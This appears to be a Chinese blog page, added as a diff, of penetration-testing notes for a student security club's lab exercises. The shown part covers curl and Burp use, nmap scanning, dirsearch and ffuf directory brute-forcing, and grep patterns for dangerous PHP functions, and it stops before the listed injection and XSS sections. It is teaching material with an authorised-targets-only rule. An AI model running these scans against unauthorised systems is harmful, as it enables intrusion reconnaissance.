@@ -1,0 +1,1003 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>数据警务社纳新笔记 | SpringQin's Blog</title><meta name="author" content="SpringQin"><meta name="copyright" content="SpringQin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="渗透实操常用命令详解 适用场景：数据警务社纳新实操题、Kali&#x2F;DVWA&#x2F;SQLi-Labs&#x2F;Upload-Labs 等本地靶场。 使用原则：只测试自己搭建的靶场或明确授权的目标。不要对学校业务系统、陌生公网 IP、运营商和他人设备执行扫描、爆破、上传或注入。  目录 通用环境与结果记录 信息收集 代码审计 文件上传漏洞 注入漏洞 XSS 漏洞 CSRF 漏洞 常用排">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据警务社纳新笔记">
+<meta property="og:url" content="https://chinaqinhao.github.io/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="SpringQin&#39;s Blog">
+<meta property="og:description" content="渗透实操常用命令详解 适用场景：数据警务社纳新实操题、Kali&#x2F;DVWA&#x2F;SQLi-Labs&#x2F;Upload-Labs 等本地靶场。 使用原则：只测试自己搭建的靶场或明确授权的目标。不要对学校业务系统、陌生公网 IP、运营商和他人设备执行扫描、爆破、上传或注入。  目录 通用环境与结果记录 信息收集 代码审计 文件上传漏洞 注入漏洞 XSS 漏洞 CSRF 漏洞 常用排">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chinaqinhao.github.io/img/avatar-ponytail.jpg">
+<meta property="article:published_time" content="2026-11-21T09:53:47.000Z">
+<meta property="article:modified_time" content="2026-11-21T09:53:53.982Z">
+<meta property="article:author" content="SpringQin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chinaqinhao.github.io/img/avatar-ponytail.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "数据警务社纳新笔记",
+  "url": "https://chinaqinhao.github.io/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/",
+  "image": "https://chinaqinhao.github.io/img/avatar-ponytail.jpg",
+  "datePublished": "2026-11-21T09:53:47.000Z",
+  "dateModified": "2026-11-21T09:53:53.982Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "SpringQin",
+      "url": "https://chinaqinhao.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://chinaqinhao.github.io/2026/11/21/%E6%95%B0%E6%8D%AE%E8%AD%A6%E5%8A%A1%E7%A4%BE%E7%BA%B3%E6%96%B0%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.7.1.260810"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '数据警务社纳新笔记',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SpringQin's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">数据警务社纳新笔记</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">数据警务社纳新笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-21T09:53:47.000Z" title="发表于 2026-11-21 17:53:47">2026-11-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-21T09:53:53.982Z" title="更新于 2026-11-21 17:53:53">2026-11-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="渗透实操常用命令详解"><a href="#渗透实操常用命令详解" class="headerlink" title="渗透实操常用命令详解"></a>渗透实操常用命令详解</h1><blockquote>
+<p>适用场景：数据警务社纳新实操题、Kali&#x2F;DVWA&#x2F;SQLi-Labs&#x2F;Upload-Labs 等本地靶场。</p>
+<p>使用原则：只测试自己搭建的靶场或明确授权的目标。不要对学校业务系统、陌生公网 IP、运营商和他人设备执行扫描、爆破、上传或注入。</p>
+</blockquote>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#1-%E9%80%9A%E7%94%A8%E7%8E%AF%E5%A2%83%E4%B8%8E%E7%BB%93%E6%9E%9C%E8%AE%B0%E5%BD%95">通用环境与结果记录</a></li>
+<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a></li>
+<li><a href="#4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">文件上传漏洞</a></li>
+<li><a href="#5-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a></li>
+<li><a href="#6-xss-%E6%BC%8F%E6%B4%9E">XSS 漏洞</a></li>
+<li><a href="#7-csrf-%E6%BC%8F%E6%B4%9E">CSRF 漏洞</a></li>
+<li><a href="#8-%E5%B8%B8%E7%94%A8%E6%8E%92%E6%9F%A5%E9%80%9F%E6%9F%A5%E8%A1%A8">常用排查速查表</a></li>
+<li><a href="#9-%E5%AE%9E%E6%93%8D%E9%A2%98%E6%A0%87%E5%87%86%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF">实操题标准答题模板</a></li>
+</ol>
+<hr>
+<h2 id="1-通用环境与结果记录"><a href="#1-通用环境与结果记录" class="headerlink" title="1. 通用环境与结果记录"></a>1. 通用环境与结果记录</h2><h3 id="1-1-确认当前用户、IP-和目标"><a href="#1-1-确认当前用户、IP-和目标" class="headerlink" title="1.1 确认当前用户、IP 和目标"></a>1.1 确认当前用户、IP 和目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">ip address</span><br><span class="line">ip route</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>whoami</code>：查看当前用户。</li>
+<li><code>id</code>：查看 UID、GID 和所属组。</li>
+<li><code>ip address</code>：查看 Kali 或靶场 IP。</li>
+<li><code>ip route</code>：查看默认网关和目标网络路由。</li>
+</ul>
+<p>在本地靶场中，常见地址是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali:  192.168.56.10</span><br><span class="line">靶场:  192.168.56.20</span><br></pre></td></tr></table></figure>
+
+<p>先确认双方是否在同一 NAT 或 Host-only 网络。</p>
+<h3 id="1-2-建立实验记录"><a href="#1-2-建立实验记录" class="headerlink" title="1.2 建立实验记录"></a>1.2 建立实验记录</h3><p>建议每个模块单独建目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/security-lab/&#123;recon,audit,upload,sqli,xss,csrf&#125;</span><br><span class="line"><span class="built_in">cd</span> ~/security-lab</span><br></pre></td></tr></table></figure>
+
+<p>把命令和输出保存下来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> 2&gt;&amp;1 | <span class="built_in">tee</span> notes/result.txt</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>2&gt;&amp;1</code>：将错误输出也合并到标准输出。</li>
+<li><code>tee</code>：同时显示在屏幕并写入文件。</li>
+<li><code>notes/result.txt</code>：保存位置。</li>
+</ul>
+<h3 id="1-3-HTTP-状态码"><a href="#1-3-HTTP-状态码" class="headerlink" title="1.3 HTTP 状态码"></a>1.3 HTTP 状态码</h3><table>
+<thead>
+<tr>
+<th>状态码</th>
+<th>含义</th>
+<th>实操中的用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>200</td>
+<td>成功</td>
+<td>页面或文件可访问</td>
+</tr>
+<tr>
+<td>204</td>
+<td>成功但无正文</td>
+<td>常用于 favicon 或空响应</td>
+</tr>
+<tr>
+<td>301&#x2F;302</td>
+<td>永久或临时跳转</td>
+<td>可能跳登录页、后台页</td>
+</tr>
+<tr>
+<td>401</td>
+<td>需要认证</td>
+<td>可能需要登录或凭据</td>
+</tr>
+<tr>
+<td>403</td>
+<td>禁止访问</td>
+<td>存在资源，但当前权限不足</td>
+</tr>
+<tr>
+<td>404</td>
+<td>资源不存在</td>
+<td>路径可能错误或文件不存在</td>
+</tr>
+<tr>
+<td>500</td>
+<td>服务器内部错误</td>
+<td>参数可能触发了后端异常</td>
+</tr>
+</tbody></table>
+<h3 id="1-4-curl-通用参数"><a href="#1-4-curl-通用参数" class="headerlink" title="1.4 curl 通用参数"></a>1.4 curl 通用参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://target/</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-i</code>：显示响应头。</li>
+<li><code>-I</code>：只发送 HEAD 请求并显示响应头。</li>
+<li><code>-v</code>：显示请求和响应细节。</li>
+<li><code>-L</code>：跟随跳转。</li>
+<li><code>-s</code>：静默模式，减少进度信息。</li>
+<li><code>-S</code>：配合 <code>-s</code>，仍显示错误。</li>
+<li><code>-o file</code>：把响应正文保存到文件。</li>
+<li><code>-c cookies.txt</code>：保存服务器返回的 Cookie。</li>
+<li><code>-b cookies.txt</code>：读取 Cookie 发送请求。</li>
+</ul>
+<p>查看响应头：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://target/</span><br></pre></td></tr></table></figure>
+
+<p>查看完整请求过程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://target/</span><br></pre></td></tr></table></figure>
+
+<p>保存页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://target/ -o index.html</span><br></pre></td></tr></table></figure>
+
+<p>只看响应状态码、响应大小和时间：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -o /dev/null -w <span class="string">&quot;status=%&#123;http_code&#125; size=%&#123;size_download&#125; time=%&#123;time_total&#125;\n&quot;</span> \</span><br><span class="line">  http://target/</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>%&#123;http_code&#125;</code>：HTTP 状态码。</li>
+<li><code>%&#123;size_download&#125;</code>：下载的正文大小。</li>
+<li><code>%&#123;time_total&#125;</code>：总请求耗时。</li>
+</ul>
+<p>比较 SQL 注入条件或盲注响应时很常用。</p>
+<h3 id="1-5-使用-Burp-代理"><a href="#1-5-使用-Burp-代理" class="headerlink" title="1.5 使用 Burp 代理"></a>1.5 使用 Burp 代理</h3><p>Burp Proxy 常见监听地址：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>浏览器代理到 Burp 后，可以用 curl 验证代理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -x http://127.0.0.1:8080 -I http://target/</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-x</code>：使用 HTTP 代理。</li>
+<li>请求会经过 Burp Proxy，便于观察和修改。</li>
+</ul>
+<p>只有在本地靶场中，才考虑使用 <code>-k</code> 忽略 HTTPS 证书错误：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k -I https://target/</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-查看页面响应和源码"><a href="#2-1-查看页面响应和源码" class="headerlink" title="2.1 查看页面响应和源码"></a>2.1 查看页面响应和源码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://target/</span><br><span class="line">curl -s http://target/ | less</span><br><span class="line">curl -s http://target/ -o index.html</span><br></pre></td></tr></table></figure>
+
+<p>重点观察：</p>
+<ul>
+<li>页面标题、技术栈和错误信息。</li>
+<li><code>Server</code>、<code>X-Powered-By</code>、<code>Set-Cookie</code>。</li>
+<li>登录、上传、搜索、查询等入口。</li>
+<li><code>?id=</code>、<code>?page=</code>、<code>?file=</code> 等参数。</li>
+<li>HTML 注释、调试信息和隐藏字段。</li>
+</ul>
+<p>查看响应头和 Cookie：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://target/login.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-检查-robots-txt-和-sitemap"><a href="#2-2-检查-robots-txt-和-sitemap" class="headerlink" title="2.2 检查 robots.txt 和 sitemap"></a>2.2 检查 robots.txt 和 sitemap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://target/robots.txt</span><br><span class="line">curl -i http://target/sitemap.xml</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<p><code>robots.txt</code> 并不是访问权限控制，它只是告诉爬虫哪些路径不希望被收录。</p>
+<p>常见敏感线索可能出现在：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">/sitemap.xml</span><br><span class="line">/backup/</span><br><span class="line">/admin/</span><br><span class="line">/source/</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Nmap-端口扫描"><a href="#2-3-Nmap-端口扫描" class="headerlink" title="2.3 Nmap 端口扫描"></a>2.3 Nmap 端口扫描</h3><p>先扫描主机是否在线：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.0/24</span><br></pre></td></tr></table></figure>
+
+<p>扫描指定端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 80,443,8080 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>扫描端口范围：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 80-90 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>扫描全部 TCP 端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>假设主机在线，跳过 ping：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>完整 TCP 连接扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p 80,443 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>常用参数：</p>
+<ul>
+<li><code>-sn</code>：只探测主机是否在线，不扫描端口。</li>
+<li><code>-sV</code>：识别服务版本。</li>
+<li><code>-p</code>：指定端口。</li>
+<li><code>-p-</code>：扫描全部 TCP 端口。</li>
+<li><code>-Pn</code>：跳过主机发现，直接扫描端口。</li>
+<li><code>-sT</code>：完整 TCP 连接扫描。</li>
+</ul>
+<p>题目中如果提示“端口在 80-90 之间”，不要直接扫描全部端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 80-90 192.168.56.10</span><br></pre></td></tr></table></figure>
+
+<p>看到开放端口后继续访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://192.168.56.10:88/</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-HTTP-服务探测"><a href="#2-4-HTTP-服务探测" class="headerlink" title="2.4 HTTP 服务探测"></a>2.4 HTTP 服务探测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://target/</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<p><code>whatweb</code> 可以辅助识别 Web 框架、CMS、服务器和部分版本信息，但版本识别结果需要人工验证。</p>
+<h3 id="2-5-Dirsearch-目录扫描"><a href="#2-5-Dirsearch-目录扫描" class="headerlink" title="2.5 Dirsearch 目录扫描"></a>2.5 Dirsearch 目录扫描</h3><p>先查看当前版本帮助：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -h</span><br></pre></td></tr></table></figure>
+
+<p>基本扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://target/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描常见扩展名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://target/ \</span><br><span class="line">  -w /usr/share/wordlists/dirb/common.txt \</span><br><span class="line">  -e php,html,txt,zip,bak</span><br></pre></td></tr></table></figure>
+
+<p>显示完整 URL：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://target/ --full-url</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-u</code>：目标 URL。</li>
+<li><code>-w</code>：字典路径。</li>
+<li><code>-e</code>：增加扩展名。</li>
+<li><code>--full-url</code>：显示完整地址。</li>
+<li><code>-r</code>：递归扫描，不要和 <code>-u</code> 混淆。</li>
+</ul>
+<p>如果系统已安装 SecLists，可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://target/ \</span><br><span class="line">  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果要结合以下信息判断：</p>
+<ul>
+<li><code>200</code>：可能真实存在。</li>
+<li><code>301/302</code>：可能跳转到目录或登录页。</li>
+<li><code>403</code>：资源可能存在但被禁止访问。</li>
+<li><code>size</code>：异常长度可能是有效响应。</li>
+</ul>
+<h3 id="2-6-ffuf-简单目录扫描"><a href="#2-6-ffuf-简单目录扫描" class="headerlink" title="2.6 ffuf 简单目录扫描"></a>2.6 ffuf 简单目录扫描</h3><p>如果安装了 ffuf：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>过滤 404：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://target/FUZZ \</span><br><span class="line">  -w /usr/share/wordlists/dirb/common.txt \</span><br><span class="line">  -<span class="built_in">fc</span> 404</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>FUZZ</code>：字典替换位置。</li>
+<li><code>-fc 404</code>：隐藏状态码 404。</li>
+</ul>
+<h3 id="2-7-DNS-和域名解析"><a href="#2-7-DNS-和域名解析" class="headerlink" title="2.7 DNS 和域名解析"></a>2.7 DNS 和域名解析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig target.com A</span><br><span class="line">dig target.com MX</span><br><span class="line">whois target.com</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>dig A</code>：查询 IPv4 地址。</li>
+<li><code>dig MX</code>：查询邮件服务器。</li>
+<li><code>whois</code>：查看注册信息，不代表有权测试。</li>
+</ul>
+<hr>
+<h2 id="3-代码审计"><a href="#3-代码审计" class="headerlink" title="3. 代码审计"></a>3. 代码审计</h2><p>代码审计不是一条命令解决，而是“找输入、跟变量、找危险函数”。</p>
+<h3 id="3-1-列出源码文件"><a href="#3-1-列出源码文件" class="headerlink" title="3.1 列出源码文件"></a>3.1 列出源码文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f</span><br><span class="line">find . -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果安装了 <code>ripgrep</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rg --files</span><br><span class="line">rg --files -g <span class="string">&quot;*.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-搜索输入点"><a href="#3-2-搜索输入点" class="headerlink" title="3.2 搜索输入点"></a>3.2 搜索输入点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;\$_GET|\$_POST|\$_COOKIE|\$_FILES|\$_SERVER&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>等价 grep：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RIn -E <span class="string">&#x27;\$_GET|\$_POST|\$_COOKIE|\$_FILES|\$_SERVER&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>解析：</p>
+<ul>
+<li><code>-n</code>：显示行号。</li>
+<li><code>-R</code>：递归目录。</li>
+<li><code>-I</code>：忽略二进制文件。</li>
+<li><code>-E</code>：使用扩展正则表达式。</li>
+</ul>
+<p>需要注意 shell 变量展开。建议用单引号包住正则：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;\$_GET&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-搜索危险函数"><a href="#3-3-搜索危险函数" class="headerlink" title="3.3 搜索危险函数"></a>3.3 搜索危险函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;eval|include|require|system|exec|shell_exec|passthru|unserialize&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>搜索文件操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;file_get_contents|file_put_contents|fopen|unlink|rename|move_uploaded_file&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>搜索 SQL 拼接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;query\(|mysqli_query|mysql_query|SELECT|INSERT|UPDATE|DELETE&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
+<p>搜索输出点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rg -n <span class="string">&#x27;echo|print|printf|innerHTML|document\.write&#x27;</span> .</span><br></pre></td></tr></table></figure>
+
